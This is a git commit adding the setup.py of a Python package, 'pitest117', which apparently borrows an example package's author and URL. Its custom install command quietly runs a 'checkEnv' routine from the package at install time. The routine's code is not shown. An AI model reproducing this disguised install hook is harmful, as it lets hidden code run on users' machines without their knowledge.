80526fea99c3694c4fb48c6f830092a43c92bebe
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-01-24 04:06:04 +0000

    Add package pitest117/1.0.4/pitest117-1.0.4.tar.gz

---
+++ packages/pitest117/pitest117-1.0.4.tar.gz/pitest117-1.0.4/setup.py
@@ -0,0 +1,32 @@
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+import atexit
+import os
+
+class InstallEnvironment(install):
+    def run(self):
+        install.run(self)
+        self.check_hardware()
+    def check_hardware(self):
+        from pitest117.extension import SetEnvironment
+        SetEnvironment.checkEnv()
+
+setup(
+    name = 'pitest117',
+    version = "1.0.4",
+    author = 'David Foster',
+    author_email = 'david.foster@ons.gov.uk',
+    url = 'https://best-practice-and-impact.github.io/example-package-python/',
+    description = 'A simple example python package.',
+    long_description_content_type = "text/x-rst",  # If this causes a warning, upgrade your setuptools package,
+    license = "MIT license",
+    packages = find_packages(exclude=["test"]),  # Don't include test directory in binary distribution
+    cmdclass={
+        'install': InstallEnvironment,
+    },
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+    ]  # Update these accordingly
+)
